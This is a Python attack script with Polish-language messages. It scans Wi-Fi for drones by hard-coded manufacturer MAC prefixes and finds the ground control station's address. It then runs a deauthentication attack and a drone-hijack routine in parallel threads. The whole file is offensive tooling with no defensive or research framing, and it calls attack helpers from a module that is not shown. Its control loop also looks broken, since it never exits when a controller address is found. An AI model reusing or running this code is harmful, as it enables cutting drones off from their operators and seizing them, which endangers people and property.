from drone_tools import (
    get_wlan_interface, get_free_wlan_interface, run_airmon, verify_monitor_iface,
    gen_airodump, filter_scan_file, direct_scan, get_gcs_mac,
    del_file, deauth_attack, drone_hijack
)
import threading

oui = ["00:12:1C", "00:26:7E", "90:03:B7", "90:3A:E6", "A0:14:3D"]


def run_deauth_mode():
    print("\n[TRYB DEAUTH - ATAK NA POŁĄCZENIE DRONA Z GCS]\n")

    mon_interface = get_wlan_interface()
    free_interface = get_free_wlan_interface()

    run_airmon(mon_interface)
    mon_interface = get_wlan_interface()
    verify_monitor_iface(mon_interface)

    iteration = 0
    try:
        while True:
            gen_airodump(mon_interface)
            result = filter_scan_file(oui)
            del_file("Parrot_scan")

            if result:
                bssid, channel, ssid, flag = result
                if flag == 1:
                    print("Znaleziono BSP")
                    break
            else:
                print("Brak dronów w zasięgu")

        while True:
            direct_scan(bssid, channel, mon_interface)
            gcs_mac = get_gcs_mac()
            del_file("Parrot_scan_bsp")
            del_file("GCS-MAC")

            if not gcs_mac:
                iteration += 1
                if iteration == 4:
                    print("Nie znaleziono adresu MAC (GCS)")
                    break

        proc1 = threading.Thread(
                target=deauth_attack, args=(bssid, gcs_mac, mon_interface))
        proc2 = threading.Thread(target=drone_hijack, args=(
                free_interface, ssid, None, bssid))

        proc1.start()
        proc2.start()

        proc1.join()
        proc2.join()

    except KeyboardInterrupt:
        print("\nZatrzymano tryb deauth przez użytkownika")